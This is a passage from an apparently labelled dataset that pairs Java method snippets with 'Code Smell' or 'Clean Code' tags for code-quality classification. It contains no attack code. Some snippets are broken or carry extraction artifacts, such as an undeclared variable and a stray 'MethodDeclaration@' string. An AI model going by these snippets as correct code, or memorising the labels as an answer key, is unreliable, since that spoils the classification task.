        Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
        if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
          groupScene.hide(otherScene);
        }
      }
      return true;
    }
  }
);
  Map.Entry<Integer,Scene> firstItem=children.entrySet().iterator().next();
  String tag=String.valueOf(firstItem.getKey());
  Scene scene=groupScene.findSceneByTag(tag);
  if (scene == null) {
    scene=firstItem.getValue();
  }
  if (!groupScene.isAdded(scene)) {
    groupScene.add(containerId,scene,tag);
  }
 else   if (!groupScene.isShowing(scene)) {
    groupScene.show(scene);
  }
  for (int i=0; i < menuIdList.size(); i++) {
    Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
    if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
      groupScene.hide(otherScene);
    }
  }
  bottomNavigationView.getMenu().findItem(firstItem.getKey()).setChecked(true);
}",1,Code Smell
"public static SqlStatementInfo sanitize(Object query){
  if (query instanceof String) {
    return sanitizeString((String)query);
  }
  if ((QUERY_CLASS != null && QUERY_CLASS.isAssignableFrom(query.getClass())) || (STATEMENT_CLASS != null && STATEMENT_CLASS.isAssignableFrom(query.getClass()))) {
    return sanitizeString(query.toString());
  }
  String queryClassName=query.getClass().getName();
  if (queryClassName.equals(""com.couchbase.client.java.view.ViewQuery"") || queryClassName.equals(""com.couchbase.client.java.view.SpatialViewQuery"")) {
    return SqlStatementInfo.create(query.toString(),null,null);
  }
  if (N1QL_QUERY_CLASS != null && N1QL_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(N1QL_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  if (ANALYTICS_QUERY_CLASS != null && ANALYTICS_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(ANALYTICS_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  return SqlStatementInfo.create(query.getClass().getSimpleName(),null,null);
}",0,Clean Code
"/** 
 * execute watch event
 */
private synchronized void watchIfNecessary() throws PluginLifeCycleException {
  if (watched.compareAndSet(false,true)) {
    List<EnhanceModel> enhanceModels=getEnhanceModels();
    if (CollectionUtils.isEmpty(enhanceModels)) {
      throw new PluginLifeCycleException(""enhance models is empty, plugin type is "" + identity());
    }
    for (    EnhanceModel em : enhanceModels) {
      EventWatchBuilder.IBuildingForBehavior behavior=null;
      EventWatchBuilder.IBuildingForClass builder4Class=new EventWatchBuilder(watcher).onClass(em.getClassPattern());
      builder4Class.isIncludeBootstrap(em.isIncludeBootstrap());
      if (em.isIncludeSubClasses()) {
        builder4Class=builder4Class.includeSubClasses();
      }
      for (      EnhanceModel.MethodPattern mp : em.getMethodPatterns()) {
        behavior=builder4Class.onBehavior(mp.getMethodName());
        if (ArrayUtils.isNotEmpty(mp.getParameterType())) {
          behavior.withParameterTypes(mp.getParameterType());
        }
        if (ArrayUtils.isNotEmpty(mp.getAnnotationTypes())) {
          behavior.hasAnnotationTypes(mp.getAnnotationTypes());
        }
      }
      if (behavior != null) {
        int watchId=behavior.onWatch(getEventListener(listener),em.getWatchTypes()).getWatchId();
        watchIds.add(watchId);
        log.info(""add watcher success,type={},watcherId={}"",getType().name(),watchId);
      }
    }
  }
}",1,Code Smell
"private void addInstruction(Insn insn){
  addInstruction(insn,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@66a8d7b9",0,Clean Code
"@Override protected void decode(ChannelHandlerContext ctx,ByteBuf buffer,List<Object> out) throws Exception {
  buffer.markReaderIndex();
  int totalLen=buffer.readInt();
  LOGGER.debug(""decode totalLen : {}"",totalLen);
  if (totalLen != buffer.readableBytes()) {
    LOGGER.error(""totalLen is not equal readableBytes.total:"" + totalLen + "";readableBytes:""+ buffer.readableBytes());
    buffer.resetReaderIndex();
    throw new Exception(""totalLen is not equal readableBytes.total"");
  }
  int msgType=buffer.readByte() & 0x1f;
  if (msgType == 4) {
    LOGGER.info(""debug decode"");
  }
  if (msgType == 3 | msgType == 5) {
    int bodyLength=buffer.readInt();
    if (bodyLength >= totalLen) {
      LOGGER.error(""bodyLen is greater than totalLen.totalLen:"" + totalLen + "";bodyLen:""+ bodyLength);
      buffer.resetReaderIndex();
      throw new Exception(""bodyLen is greater than totalLen.totalLen"");
    }
    byte[] bodyBytes=null;
    if (bodyLength > 0) {
      bodyBytes=new byte[bodyLength];
      buffer.readBytes(bodyBytes);
    }
    int attrLength=buffer.readInt();
    byte[] attrBytes=null;
    if (attrLength > 0) {
      attrBytes=new byte[attrLength];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(bodyBytes,new String(attrBytes,StandardCharsets.UTF_8));
    object.setMsgtype(5);
    out.add(object);
  }
 else   if (msgType == 7) {
    int seqId=buffer.readInt();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    EncodeObject object=new EncodeObject(new String(attrBytes,StandardCharsets.UTF_8));
    object.setMessageId(String.valueOf(seqId));
    buffer.readShort();
    object.setMsgtype(msgType);
    out.add(object);
  }
 else   if (msgType == 8) {
    buffer.skipBytes(4 + 1 + 4);
    final short load=buffer.readShort();
    int attrLen=buffer.readShort();
    byte[] attrBytes=null;
    if (attrLen > 0) {
      attrBytes=new byte[attrLen];
      buffer.readBytes(attrBytes);
    }
    buffer.skipBytes(2);
    String attrs=(attrBytes == null ? """" : new String(attrBytes,StandardCharsets.UTF_8));
    EncodeObject object=new EncodeObject(attrs);
    object.setMsgtype(8);
    object.setLoad(load);
    out.add(object);
  }
}",1,Code Smell
"public boolean manageFlows(Level world,BlockPos pos,FluidStack internalFluid,Predicate<FluidStack> extractionPredicate){
  Optional<FluidNetwork> retainedNetwork=network;
  network=Optional.empty();
  if (!source.isPresent() && !determineSource(world,pos))   return false;
  FlowSource flowSource=source.get();
  if (!hasFlow()) {
    if (!hasPressure())     return false;
    boolean prioritizeInbound=comparePressure() < 0;
    for (    boolean trueFalse : Iterate.trueAndFalse) {
      boolean inbound=prioritizeInbound == trueFalse;
      if (pressure.get(inbound) == 0)       continue;
      if (tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid))       return true;
    }
    return false;
  }
  Flow flow=this.flow.get();
  FluidStack provided=flow.inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid;
  if (!hasPressure() || provided.isEmpty() || !provided.isFluidEqual(flow.fluid)) {
    this.flow=Optional.empty();
    return true;
  }
  if (flow.inbound != comparePressure() < 0) {
    boolean inbound=!flow.inbound;
    if (inbound && !provided.isEmpty() || !inbound && !internalFluid.isEmpty()) {
      FluidPropagator.resetAffectedFluidNetworks(world,pos,side);
      tryStartingNewFlow(inbound,inbound ? flowSource.provideFluid(extractionPredicate) : internalFluid);
      return true;
    }
  }
  flowSource.whileFlowPresent(world,flow.inbound);
  if (!flowSource.isEndpoint())   return false;
  if (!flow.inbound)   return false;
  network=retainedNetwork;
  if (!hasNetwork())   network=Optional.of(new FluidNetwork(world,new BlockFace(pos,side),flowSource::provideHandler));
  network.get().tick();
  return false;
}",1,Code Smell
"/** 
 * If a record type allows implicit references to fields, recursively looks into the fields. Otherwise returns immediately. 
 */
void resolveInNamespace(SqlValidatorNamespace ns,boolean nullable,List<String> names,SqlNameMatcher nameMatcher,Path path,Resolved resolved){
  if (names.isEmpty()) {
    resolved.found(ns,nullable,this,path,null);
    return;
  }
  final RelDataType rowType=ns.getRowType();
  if (rowType.isStruct()) {
    SqlValidatorTable validatorTable=ns.getTable();
    if (validatorTable instanceof Prepare.PreparingTable) {
      Table t=((Prepare.PreparingTable)validatorTable).unwrap(Table.class);
      if (t instanceof CustomColumnResolvingTable) {
        final List<Pair<RelDataTypeField,List<String>>> entries=((CustomColumnResolvingTable)t).resolveColumn(rowType,validator.getTypeFactory(),names);
        for (        Pair<RelDataTypeField,List<String>> entry : entries) {
          final RelDataTypeField field=entry.getKey();
          final List<String> remainder=entry.getValue();
          final SqlValidatorNamespace ns2=new FieldNamespace(validator,field.getType());
          final Step path2=path.plus(rowType,field.getIndex(),field.getName(),StructKind.FULLY_QUALIFIED);
          resolveInNamespace(ns2,nullable,remainder,nameMatcher,path2,resolved);
        }
        return;
      }
    }
    final String name=names.get(0);
    final RelDataTypeField field0=nameMatcher.field(rowType,name);
    if (field0 != null) {
      final SqlValidatorNamespace ns2=ns.lookupChild(field0.getName());
      final Step path2=path.plus(rowType,field0.getIndex(),field0.getName(),StructKind.FULLY_QUALIFIED);
      resolveInNamespace(ns2,nullable,names.subList(1,names.size()),nameMatcher,path2,resolved);
    }
 else {
      for (      RelDataTypeField field : rowType.getFieldList()) {
switch (field.getType().getStructKind()) {
case PEEK_FIELDS:
case PEEK_FIELDS_DEFAULT:
case PEEK_FIELDS_NO_EXPAND:
          final Step path2=path.plus(rowType,field.getIndex(),field.getName(),field.getType().getStructKind());
        final SqlValidatorNamespace ns2=ns.lookupChild(field.getName());
      resolveInNamespace(ns2,nullable,names,nameMatcher,path2,resolved);
  }
}
}
}
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
  factory.setNamespaceAware(false);
  DocumentBuilder builder=factory.newDocumentBuilder();
  Document doc;
  try (FileInputStream in=new FileInputStream(""mastodon/src/main/res/values/strings.xml"")){
    doc=builder.parse(in);
  }
   NodeList list=doc.getDocumentElement().getChildNodes();
  for (int i=0; i < list.getLength(); i++) {
    if (list.item(i) instanceof Element) {
      String name=el.getAttribute(""name"");
      String value;
      if (""string"".equals(el.getTagName())) {
        value=el.getTextContent();
      }
 else       if (""plurals"".equals(el.getTagName())) {
        value=el.getElementsByTagName(""item"").item(0).getTextContent();
      }
 else {
        System.out.println(""Warning: unexpected tag "" + name);
        continue;
      }
      ArrayList<String> placeholders=new ArrayList<>();
      Matcher matcher=fsPattern.matcher(value);
      while (matcher.find()) {
        placeholders.add(matcher.group());
      }
      placeholdersInStrings.put(name,placeholders);
    }
  }
  for (  File file : new File(""mastodon/src/main/res"").listFiles()) {
    if (file.getName().startsWith(""values-"")) {
      File stringsXml=new File(file,""strings.xml"");
      if (stringsXml.exists()) {
        processFile(stringsXml);
      }
    }
  }
  if (errorCount > 0) {
    System.err.println(""Found "" + errorCount + "" problems in localized strings"");
    System.exit(1);
  }
}",0,Clean Code
"public void updateTopicData(long dialogId,TLRPC.TL_forumTopic fromTopic,int flags){
  if (fromTopic == null) {
    return;
  }
  storageQueue.postRunnable(() -> {
    SQLitePreparedStatement state=null;
    SQLiteCursor cursor=null;
    try {
      if ((flags & TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) != 0) {
        state=database.executeFast(""UPDATE topics SET total_messages_count = ? WHERE did = ? AND topic_id = ?"");
        state.requery();
        state.bindInteger(1,fromTopic.totalMessagesCount);
        state.bindLong(2,dialogId);
        state.bindInteger(3,fromTopic.id);
        state.step();
        state.dispose();
        if (flags == TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) {
          return;
        }
      }
      TLRPC.TL_forumTopic topicToUpdate=null;
      cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM topics WHERE did = %d AND topic_id = %d"",dialogId,fromTopic.id));
      if (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          topicToUpdate=TLRPC.TL_forumTopic.TLdeserialize(data,data.readInt32(true),true);
          data.reuse();
        }
      }
      cursor.dispose();
      cursor=null;
      if (topicToUpdate != null) {
        if ((flags & TopicsController.TOPIC_FLAG_TITLE) != 0) {
          topicToUpdate.title=fromTopic.title;
        }
        if ((flags & TopicsController.TOPIC_FLAG_ICON) != 0) {
          topicToUpdate.icon_emoji_id=fromTopic.icon_emoji_id;
          topicToUpdate.flags|=1;
        }
        if ((flags & TopicsController.TOPIC_FLAG_PIN) != 0) {
          topicToUpdate.pinned=fromTopic.pinned;
          topicToUpdate.pinnedOrder=fromTopic.pinnedOrder;
        }
        int pinnedOrder=topicToUpdate.pinned ? 1 + topicToUpdate.pinnedOrder : 0;
        if ((flags & TopicsController.TOPIC_FLAG_CLOSE) != 0) {
          topicToUpdate.closed=fromTopic.closed;
        }
        if ((flags & TopicsController.TOPIC_FLAG_HIDE) != 0) {
          topicToUpdate.hidden=fromTopic.hidden;
        }
        state=database.executeFast(""UPDATE topics SET data = ?, pinned = ?, hidden = ? WHERE did = ? AND topic_id = ?"");
        database.beginTransaction();
        NativeByteBuffer data=new NativeByteBuffer(topicToUpdate.getObjectSize());
        topicToUpdate.serializeToStream(data);
        state.bindByteBuffer(1,data);
        state.bindInteger(2,pinnedOrder);
        state.bindInteger(3,topicToUpdate.hidden ? 1 : 0);
        state.bindLong(4,dialogId);
        state.bindInteger(5,topicToUpdate.id);
        state.step();
        data.reuse();
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (state != null) {
        state.dispose();
      }
      if (cursor != null) {
        cursor.dispose();
      }
      database.commitTransaction();
    }
  }
);
}",1,Code Smell
"/** 
 * query worker group paging
 * @param loginUser login user
 * @param pageNo    page number
 * @param searchVal search value
 * @param pageSize  page size
 * @return worker group list page
 */
@Override public Result queryAllGroupPaging(User loginUser,Integer pageNo,Integer pageSize,String searchVal){
  int fromIndex=(pageNo - 1) * pageSize;
  int toIndex=(pageNo - 1) * pageSize + pageSize;
  Result result=new Result();
  List<WorkerGroupPageDetail> workerGroupPageDetails;
  if (loginUser.getUserType().equals(UserType.ADMIN_USER)) {
    workerGroupPageDetails=getUiWorkerGroupPageDetails(null);
  }
 else {
    Set<Integer> ids=resourcePermissionCheckService.userOwnedResourceIdsAcquisition(AuthorizationType.WORKER_GROUP,loginUser.getId(),log);
    workerGroupPageDetails=getUiWorkerGroupPageDetails(ids.isEmpty() ? Collections.emptyList() : new ArrayList<>(ids));
  }
  List<WorkerGroupPageDetail> resultDataList=new ArrayList<>();
  int total=0;
  if (CollectionUtils.isNotEmpty(workerGroupPageDetails)) {
    List<WorkerGroupPageDetail> searchValDataList=new ArrayList<>();
    if (!StringUtils.isEmpty(searchVal)) {
      for (      WorkerGroupPageDetail workerGroup : workerGroupPageDetails) {
        if (workerGroup.getName().contains(searchVal)) {
          searchValDataList.add(workerGroup);
        }
      }
    }
 else {
      searchValDataList=workerGroupPageDetails;
    }
    total=searchValDataList.size();
    if (fromIndex < searchValDataList.size()) {
      if (toIndex > searchValDataList.size()) {
        toIndex=searchValDataList.size();
      }
      resultDataList=searchValDataList.subList(fromIndex,toIndex);
    }
  }
  List<WorkerGroupPageDetail> configWorkerGroupPageDetails=getConfigWorkerGroupPageDetail();
  configWorkerGroupPageDetails.addAll(resultDataList);
  PageInfo<WorkerGroupPageDetail> pageInfo=new PageInfo<>(pageNo,pageSize);
  pageInfo.setTotal(total);
  pageInfo.setTotalList(configWorkerGroupPageDetails);
  result.setData(pageInfo);
  putMsg(result,Status.SUCCESS);
  return result;
}",1,Code Smell
"private void copySoFile(){
  String[] existLibPathArray=new String[3];
  int arrayIndex=0;
  for (  String libPath : APK_LIB_PATH_ARRAY) {
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    if (apkSoFullPathFile.exists()) {
      existLibPathArray[arrayIndex]=libPath;
      arrayIndex++;
    }
  }
  if (arrayIndex == 0) {
    String libPath=APK_LIB_PATH_ARRAY[0];
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    apkSoFullPathFile.mkdirs();
    existLibPathArray[arrayIndex]=libPath;
  }
  for (  String libPath : existLibPathArray) {
    if (libPath != null && !libPath.isEmpty()) {
      String apkSoFullPath=fullLibPath(libPath);
      copyLibFile(apkSoFullPath,mSoFilePathMap.get(libPath));
    }
  }
  if (xposedModuleArray != null && xposedModuleArray.length > 0) {
    int index=0;
    for (    String modulePath : xposedModuleArray) {
      modulePath=modulePath.trim();
      if (modulePath == null || modulePath.length() == 0) {
        continue;
      }
      File moduleFile=new File(modulePath);
      if (!moduleFile.exists()) {
        continue;
      }
      for (      String libPath : existLibPathArray) {
        if (libPath != null && !libPath.isEmpty()) {
          String apkSoFullPath=fullLibPath(libPath);
          String outputModuleName=XPOSED_MODULE_FILE_NAME_PREFIX + index + SO_FILE_SUFFIX;
          File outputModuleSoFile=new File(apkSoFullPath,outputModuleName);
          FileUtils.copyFile(moduleFile,outputModuleSoFile);
        }
      }
      index++;
    }
  }
}",1,Code Smell
"private FileBaseStatistics getFileStats(FileBaseStatistics cachedStats,org.apache.hadoop.fs.Path[] hadoopFilePaths,ArrayList<FileStatus> files) throws IOException {
  long latestModTime=0L;
  for (  org.apache.hadoop.fs.Path hadoopPath : hadoopFilePaths) {
    final Path filePath=new Path(hadoopPath.toUri());
    final FileSystem fs=FileSystem.get(filePath.toUri());
    final FileStatus file=fs.getFileStatus(filePath);
    latestModTime=Math.max(latestModTime,file.getModificationTime());
    if (file.isDir()) {
      FileStatus[] fss=fs.listStatus(filePath);
      files.ensureCapacity(files.size() + fss.length);
      for (      FileStatus s : fss) {
        if (!s.isDir()) {
          files.add(s);
          latestModTime=Math.max(s.getModificationTime(),latestModTime);
        }
      }
    }
 else {
      files.add(file);
    }
  }
  if (cachedStats != null && latestModTime <= cachedStats.getLastModificationTime()) {
    return cachedStats;
  }
  long len=0;
  for (  FileStatus s : files) {
    len+=s.getLen();
  }
  if (len <= 0) {
    len=BaseStatistics.SIZE_UNKNOWN;
  }
  return new FileBaseStatistics(latestModTime,len,BaseStatistics.AVG_RECORD_BYTES_UNKNOWN);
}",1,Code Smell
"/** 
 * Change the sign in the expression to P (positive) N (negative)
 * @param expression
 * @return eg. ""-3+-6*(+8)-(-5) -> S3+S6*(P8)-(S5)""
 */
private static String convert(String expression){
  char[] arr=expression.toCharArray();
  for (int i=0; i < arr.length; i++) {
    if (arr[i] == SUBTRACT_CHAR) {
      if (i == 0) {
        arr[i]=N;
      }
 else {
        char c=arr[i - 1];
        if (c == ADD_CHAR || c == SUBTRACT_CHAR || c == MULTIPLY_CHAR || c == DIVISION_CHAR || c == LEFT_BRACE_CHAR) {
          arr[i]=N;
        }
      }
    }
 else     if (arr[i] == ADD_CHAR) {
      if (i == 0) {
        arr[i]=P;
      }
 else {
        char c=arr[i - 1];
        if (c == ADD_CHAR || c == SUBTRACT_CHAR || c == MULTIPLY_CHAR || c == DIVISION_CHAR || c == LEFT_BRACE_CHAR) {
          arr[i]=P;
        }
      }
    }
  }
  return new String(arr);
}",1,Code Smell
"public void reEvaluateCheckRT(long checkRT,HealthCheckTask task,SwitchDomain.HealthParams params){
  task.setCheckRTLast(checkRT);
  if (checkRT > task.getCheckRTWorst()) {
    task.setCheckRTWorst(checkRT);
  }
  if (checkRT < task.getCheckRTBest()) {
    task.setCheckRTBest(checkRT);
  }
  checkRT=(long)((params.getFactor() * task.getCheckRTNormalized()) + (1 - params.getFactor()) * checkRT);
  if (checkRT > params.getMax()) {
    checkRT=params.getMax();
  }
  if (checkRT < params.getMin()) {
    checkRT=params.getMin();
  }
  task.setCheckRTNormalized(checkRT);
}",0,Clean Code
"boolean bfs(int courses,int[][] prereq){
  ArrayList[] graph=new ArrayList[courses];
  int count=0;
  int[] degree=new int[courses];
  Queue<Integer> q=new LinkedList<>();
  for (int i=0; i < courses; i++)   graph[i]=new ArrayList();
  for (int i=0; i < prereq.length; i++) {
    graph[prereq[i][0]].add(prereq[i][1]);
    degree[prereq[i][1]]++;
  }
  for (int i=0; i < courses; i++) {
    if (degree[i] == 0) {
      q.add(i);
      count++;
    }
  }
  while (!q.isEmpty()) {
    int course=q.poll();
    for (int i=0; i < graph[course].size(); i++) {
      int pointer=(int)graph[course].get(i);
      degree[pointer]--;
      if (degree[pointer] == 0) {
        q.offer(pointer);
        count++;
      }
    }
  }
  if (count == courses)   return true;
  return false;
}",1,Code Smell
"/** 
 * @hide 
 */
@Override public CharSequence getText(int id) throws NotFoundException {
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(id);
}
/** 
 * @hide 
 */
@Override public CharSequence getText(int id,CharSequence def){
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId,def);
  }
  return super.getText(id,def);
}
@Override public CharSequence getText(int index){
  Object replacement=((XResources)getResources()).getReplacement(getResourceId(index,0));
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(index);
}",0,Clean Code
"public static void main(String[] args){
  ConfigurableEnvironment environment=new StandardEnvironment();
  environment.setActiveProfiles(""dev"");
  System.out.println(""Active Profiles: "" + String.join("", "",environment.getActiveProfiles()));
  environment.addActiveProfile(""test"");
  System.out.println(""Updated Active Profiles: "" + String.join("", "",environment.getActiveProfiles()));
  environment.setDefaultProfiles(""default"");
  System.out.println(""Default Profiles: "" + String.join("", "",environment.getDefaultProfiles()));
  Map<String,Object> systemProperties=environment.getSystemProperties();
  System.out.println(""System Properties: "" + systemProperties);
  Map<String,Object> systemEnvironment=environment.getSystemEnvironment();
  System.out.println(""System Environment: "" + systemEnvironment);
  Map<String,Object> properties=new HashMap<>();
  properties.put(""app.name"",""Spring-Reading"");
  properties.put(""app.version"",""1.0.0"");
  StandardEnvironment standardEnvironment=new StandardEnvironment();
  standardEnvironment.getPropertySources().addFirst(new MapPropertySource(""myEnvironment"",properties));
  environment.merge(standardEnvironment);
  MutablePropertySources propertySources=environment.getPropertySources();
  System.out.println(""MutablePropertySources: "" + propertySources);
}",0,Clean Code
"/** 
 * Check all components that needs to be disabled/enabled and assign to be disabled/enabled if necessary.
 */
public int invalidateComponents(){
  int invalidated=0;
  boolean canCheckExistence=mComponents != null;
  List<ComponentRule> allEntries=getAllComponents();
  for (  ComponentRule entry : allEntries) {
    if (canCheckExistence && !mComponents.contains(entry.name)) {
      removeEntry(entry);
      ++invalidated;
      continue;
    }
    try {
      int s=PackageManagerCompat.getComponentEnabledSetting(new ComponentName(entry.packageName,entry.name),userId);
switch (entry.getComponentStatus()) {
case ComponentRule.COMPONENT_BLOCKED_IFW_DISABLE:
case ComponentRule.COMPONENT_DISABLED:
        if (s == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || s == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
          addComponent(entry.name,entry.type,entry.getToBe());
          ++invalidated;
        }
      break;
case ComponentRule.COMPONENT_ENABLED:
    if (s != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
      addComponent(entry.name,entry.type,entry.getToBe());
      ++invalidated;
    }
  break;
}
}
 catch (Throwable ignore) {
}
}
return invalidated;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public InteractionResult use(BlockState p_49515_,Level level,BlockPos p_49517_,Player p_49518_,InteractionHand p_49519_,BlockHitResult p_49520_){
  if (level.isClientSide) {
    return InteractionResult.CONSUME;
  }
 else {
    if (p_49515_.getValue(PART) != BedPart.HEAD) {
      p_49517_=p_49517_.relative(p_49515_.getValue(FACING));
      p_49515_=level.getBlockState(p_49517_);
      if (!p_49515_.is((BedBlock)(Object)this)) {
        return InteractionResult.CONSUME;
      }
    }
    if (p_49515_.getValue(OCCUPIED)) {
      if (!this.kickVillagerOutOfBed(level,p_49517_)) {
        p_49518_.displayClientMessage(Component.translatable(""block.minecraft.bed.occupied""),true);
      }
      return InteractionResult.SUCCESS;
    }
 else {
      var pos=p_49517_;
      var state=p_49515_;
      p_49518_.startSleepInBed(pos).ifLeft((p_49477_) -> {
        if (!level.dimensionType().bedWorks()) {
          level.removeBlock(pos,false);
          BlockPos blockpos=pos.relative(state.getValue(FACING).getOpposite());
          if (level.getBlockState(blockpos).is((BedBlock)(Object)this)) {
            level.removeBlock(blockpos,false);
          }
          Vec3 vec3d=pos.getCenter();
          level.explode(null,level.damageSources().badRespawnPointExplosion(vec3d),null,vec3d,5.0F,true,Level.ExplosionInteraction.BLOCK);
        }
 else         if (p_49477_.getMessage() != null) {
          p_49518_.displayClientMessage(p_49477_.getMessage(),true);
        }
      }
);
      return InteractionResult.SUCCESS;
    }
  }
}",1,Code Smell
"private void addTaskEdge(List<WorkflowTaskRelation> workflowTaskRelations){
  for (  WorkflowTaskRelation workflowTaskRelation : workflowTaskRelations) {
    long pre=workflowTaskRelation.getPreTaskCode();
    long post=workflowTaskRelation.getPostTaskCode();
    if (pre > 0 && post > 0) {
      if (!taskDefinitionCodeMap.containsKey(pre)) {
        throw new IllegalArgumentException(""Cannot find task: "" + pre);
      }
      if (!taskDefinitionCodeMap.containsKey(post)) {
        throw new IllegalArgumentException(""Cannot find task: "" + post);
      }
      TaskDefinition preTask=checkNotNull(taskDefinitionCodeMap.get(pre),""Cannot find task: "" + pre);
      TaskDefinition postTask=checkNotNull(taskDefinitionCodeMap.get(post),""Cannot find task: "" + pre);
      List<String> predecessorsTasks=predecessors.get(postTask.getName());
      if (predecessorsTasks.contains(preTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      predecessorsTasks.add(preTask.getName());
      List<String> successTasks=successors.get(preTask.getName());
      if (successTasks.contains(postTask.getName())) {
        throw new IllegalArgumentException(""The task relation from "" + preTask.getName() + "" to ""+ postTask.getName()+ "" is already exists"");
      }
      successTasks.add(postTask.getName());
    }
    if (pre <= 0 && post <= 0) {
      throw new IllegalArgumentException(""The task relation from "" + pre + "" to ""+ post+ "" is invalid"");
    }
  }
}",1,Code Smell
"/** 
 * @param rendererTrackTypes The track type handled by each renderer.
 * @param rendererTrackGroups The {@link TrackGroup}s mapped to each renderer.
 * @param rendererMixedMimeTypeAdaptiveSupports The result of {@link RendererCapabilities#supportsMixedMimeTypeAdaptation()} for each renderer.
 * @param rendererFormatSupports The result of {@link RendererCapabilities#supportsFormat} foreach mapped track, indexed by renderer, track group and track (in that order).
 * @param unmappedTrackGroups {@link TrackGroup}s not mapped to any renderer.
 */
@SuppressWarnings(""deprecation"") MappedTrackInfo(int[] rendererTrackTypes,TrackGroupArray[] rendererTrackGroups,int[] rendererMixedMimeTypeAdaptiveSupports,int[][][] rendererFormatSupports,TrackGroupArray unmappedTrackGroups){
  this.rendererTrackTypes=rendererTrackTypes;
  this.rendererTrackGroups=rendererTrackGroups;
  this.rendererFormatSupports=rendererFormatSupports;
  this.rendererMixedMimeTypeAdaptiveSupports=rendererMixedMimeTypeAdaptiveSupports;
  this.unmappedTrackGroups=unmappedTrackGroups;
  this.rendererCount=rendererTrackTypes.length;
  this.length=rendererCount;
}
",0,Clean Code
"/** 
 * Clears a track selection override for the specified renderer and  {@link TrackGroupArray}.
 * @param rendererIndex The renderer index.
 * @param groups The {@link TrackGroupArray} for which the override should be cleared.
 * @return This builder.
 */
public final ParametersBuilder clearSelectionOverride(int rendererIndex,TrackGroupArray groups){
  Map<TrackGroupArray,SelectionOverride> overrides=selectionOverrides.get(rendererIndex);
  if (overrides == null || !overrides.containsKey(groups)) {
    return this;
  }
  overrides.remove(groups);
  if (overrides.isEmpty()) {
    selectionOverrides.remove(rendererIndex);
  }
  return this;
}
/** 
 * @deprecated Use {@link ParametersBuilder#clearSelectionOverride(int,TrackGroupArray)}. 
 */
@Deprecated public final void clearSelectionOverride(int rendererIndex,TrackGroupArray groups){
  setParameters(buildUponParameters().clearSelectionOverride(rendererIndex,groups));
}
",0,Clean Code
"@Override public boolean onExecute(String verb,String parameter,MissionInit missionInit){
  if (verb == null || verb.length() == 0) {
    return false;
  }
  if (verb.equalsIgnoreCase(ContinuousMovementCommand.MOVE.value())) {
    float targetVelocity=clamp(Float.valueOf(parameter));
    if (targetVelocity != mTargetVelocity) {
      mTargetVelocity=targetVelocity;
      mTicksSinceLastVelocityChange=0;
    }
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.STRAFE.value())) {
    this.overrideMovement.moveStrafe=-clamp(Float.valueOf(parameter));
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.PITCH.value())) {
    this.pitchScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else   if (verb.equalsIgnoreCase(ContinuousMovementCommand.TURN.value())) {
    this.yawScale=clamp(Float.valueOf(parameter));
    this.lastAngularUpdateTime=System.currentTimeMillis();
    return true;
  }
 else {
    boolean value=parameter.equalsIgnoreCase(ON_COMMAND_STRING);
    if (verb.equals(ContinuousMovementCommand.JUMP.value())) {
      this.overrideMovement.jump=value;
      return true;
    }
 else     if (verb.equalsIgnoreCase(ContinuousMovementCommand.CROUCH.value())) {
      this.overrideMovement.sneak=value;
      return true;
    }
  }
  return false;
}",0,Clean Code
"private void relationalExpression() throws Exception {
  ArithmeticExpression();
  String currentReturnType="""";
  if (jackClasses.dataTypeTransfer.containsKey(expressionReturnType)) {
    currentReturnType=(String)jackClasses.dataTypeTransfer.get(expressionReturnType);
  }
 else {
    currentReturnType=(expressionReturnType + ""|null|Array"");
  }
